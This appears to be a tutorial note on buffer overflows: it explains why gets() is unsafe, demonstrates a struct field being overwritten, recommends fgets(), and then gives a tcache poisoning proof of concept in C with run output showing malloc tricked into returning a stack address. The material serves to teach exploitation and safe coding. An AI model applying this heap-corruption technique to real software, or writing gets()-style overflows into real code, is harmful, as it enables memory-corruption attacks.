# Buffer overflows

A buffer overflow occurs when a program writes more data to a buffer than the buffer can hold. This can cause the program to crash, or worse, allow an attacker to execute arbitrary code on the system.

## Buffer overflow with `gets()`
[gets man page](https://linux.die.net/man/3/gets)
> Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead. - From man page from above.

## [Why gets() is bad / Buffer overflows]()
When people are introduced to C, they are often shown the gets() function as a method to get some input from the user/keyboard. It appears that some teachers are also quite insistant that their pupils continue to use it. Well, this is OK for a day one lesson, but gets() has an inherent problem that causes most coders to avoid using it. This quick overview will hopefully help new coders understand the problem, how to get around it, and also how it might also affect their own functions.

#### The problem

First, let's look at the prototype for this function:

```c
#include <stdio.h>
char *gets(char *s);
```

You can see that the one and only parameter is a char pointer. So then, if we make an array like this:
```c
char buf[100];
```
we could pass it to gets() like so:
```c
gets(buf)
```
So far, so good. Or so it seems... but really our problem has already begun. gets() has only received the name of the array (a pointer), it does not know how big the array is, and it is impossible to determine this from the pointer alone. When the user enters their text, gets() will read all available data into the array, this will be fine if the user is sensible and enters less than 99 bytes. However, if they enter more than 99, gets() will not stop writing at the end of the array. Instead, it continues writing past the end and into memory it doesn't own.

This problem may manifest itself in a number of ways:

No visible affect what-so-ever

Immediate program termination (a crash)

Termination at a later point in the programs life time (maybe 1 second later, maybe 15 days later)

Termination of another, unrelated program

Incorrect program behaviour and/or calculation

... and the list goes on. This is the problem with "buffer overflow" bugs, you just can't tell when and how they'll bite you.

#### A demonstration

Here is some sample code showing this problem. The output is subject to change due to its unpredictable nature.

```c
#include <stdio.h> 

typedef struct MyStruct
{
  char buf[5];
  int  i;
} MyStruct_t;

int main(void)
{
  MyStruct_t my;
  
  my.i = 10;
  
  printf ("my.i is %d\n", my.i);
  printf ("Enter a 10 digit number:");  /* Too big on purpose  */
  
  gets(my.buf);
  
  printf ("my.buf is >%s<\n", my.buf);
  printf ("my.i is %d\n", my.i);
  
  return(0);
}

/*
 * Output (on my BCC 5.5 compiler)
 my.i is 10
 Enter a 10 digit number:1234567890
 my.buf is >1234567890<
 my.i is 12345
 *
 */
```

As you can see, the input buffer is 5 bytes in length (4 data, plus one for the null terminator). The initial value of the int within the structure is set to 10, but after the gets() function has been called, the value has been changed. Go here for more on buffer overflows and other security vulnerabilities.

#### A resolution

To get around this problem, ensure you use a more secure function for performing reads. For example, fgets() is a buffer safe function. Its prototype is:
```c
#include <stdio.h>
char *fgets(char *s, int size, FILE *stream);
```
The are some examples here, but for ease, here is a quick sample:
```c
fgets(buf, sizeof(buf), stdin);
```
Written by Hammer 


## Buffer overflows in tcache - tcache attack explained
```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    puts("So this is a quick demo of a tcache attack.");
    puts("The tcache is a bin that stores recently freed chunks (max 7 per idx by default).");
    puts("The tcache bin consists of a linked list, where one chunk points to the next chunk.");
    puts("This attack consists of using a bug to overwrite a pointer in the linked list to an address we want to allocate, then allocating it when it's that chunks turn to be allocated.");
    puts("Also the tcache was introduced in glibc version 2.26, so you won't be able to do this attack in libc versions before that.");
    puts("\n");

    printf("So let's start off by allocated two chunks, and let's initialize a stack integer.\n");

    unsigned long int *ptr0, *ptr1;
    int target;

    ptr0 = malloc(0x10);
    ptr1 = malloc(0x10);
    target = 0xdead;

    printf("ptr0: %p\n", ptr0);
    printf("ptr1: %p\n", ptr1);
    printf("int:  %p\n\n", &target);

    printf("Our objective here is to get malloc to return a pointer to the stack variable. Here that doesn't serve as much purpose (this is more of a proof of concept). However in a lot of different situations we can write to a chunk that is allocated.\n");
    printf("In addition to that, instead of allocating a chunk to a stack integer, we can allocate a chunk to something more interesting (like the saved return address or the hook to a function).\n");
    printf("So we will continue by freeing the two heap chunks, which will store them in the tcache.\n\n");

    free(ptr0);
    free(ptr1);

    printf("At this point, the two chunks we allocated using malloc are in the tcache. We can also see that there is a linked list which is used to keep track of which chunk is next in the tcache.\n\n");

    printf("Next pointer for ptr1: %p\n\n", (unsigned long int *)*ptr1);

    printf("As you can see, it points to the first chunk we allocated. This is chunks in the tcache are allocated in the reverse order in which they are inserted into it (think LIFO).\n");
    printf("So if we were to overwrite this pointer with a Use After Free bug (I'm pretending I have a UAF to ptr1 here), we can control the chunk which will be allocated from the tcache after ptr1.\n");
    printf("Let's write the address of the target stack integer over the next pointer.\n\n");

    *ptr1 = (unsigned long int)&target;
    printf("Next pointer for ptr1: %p\n\n", (unsigned long int *)*ptr1);

    printf("Now we will allocate a chunk. This should return the ptr1 chunk, and place the address of our target stack variable at the top of the tcache.\n\n");

    printf("Malloc Allocated: %p\n\n", malloc(0x10));

    printf("Now that the address of our stack integer is at the top of the tcache, the next chunk we allocate will be the target integer.\n\n");

    printf("Malloc Allocated: %p\n\n", malloc(0x10));

    printf("Just like that, we got malloc to allocate a chunk to the target stack variable. In practice we would try and allocate a chunk to something much more interesting (but this is more of a proof of concept).\n");
}
```

```c
$   ./tcache_explanation 
So this is a quick demo of a tcache attack.
The tcache is a bin that stores recently freed chunks (max 7 per idx by default).
The tcache bin consists of a linked list, where one chunk points to the next chunk.
This attack consists of using a bug to overwrite a pointer in the linked list to an address we want to allocate, then allocating it when it's that chunks turn to be allocated.
Also the tcache was introduced in glibc version 2.26, so you won't be able to do this attack in libc versions before that.


So let's start off by allocated two chunks, and let's initialize a stack integer.
ptr0: 0x55a330441670
ptr1: 0x55a330441690
int:  0x7ffe00b8da64

Our objective here is to get malloc to return a pointer to the stack variable. Here that doesn't serve as much purpose (this is more of a proof of concept). However in a lot of different situations we can write to a chunk that is allocated.
In addition to that, instead of allocating a chunk to a stack integer, we can allocate a chunk to something more interesting (like the saved return address or the hook to a function).
So we will continue by freeing the two heap chunks, which will store them in the tcache.

At this point, the two chunks we allocated using malloc are in the tcache. We can also see that there is a linked list which is used to keep track of which chunk is next in the tcache.

Next pointer for ptr1: 0x55a330441670

As you can see, it points to the first chunk we allocated. This is chunks in the tcache are allocated in the reverse order in which they are inserted into it (think LIFO).
So if we were to overwrite this pointer with a Use After Free bug (I'm pretending I have a UAF to ptr1 here), we can control the chunk which will be allocated from the tcache after ptr1.
Let's write the address of the target stack integer over the next pointer.

Next pointer for ptr1: 0x7ffe00b8da64

Now we will allocate a chunk. This should return the ptr1 chunk, and place the address of our target stack variable at the top of the tcache.

Malloc Allocated: 0x55a330441690

Now that the address of our stack integer is at the top of the tcache, the next chunk we allocate will be the target integer.

Malloc Allocated: 0x7ffe00b8da64

Just like that, we got malloc to allocate a chunk to the target stack variable. In practice we would try and allocate a chunk to something much more interesting (but this is more of a proof of concept).

```
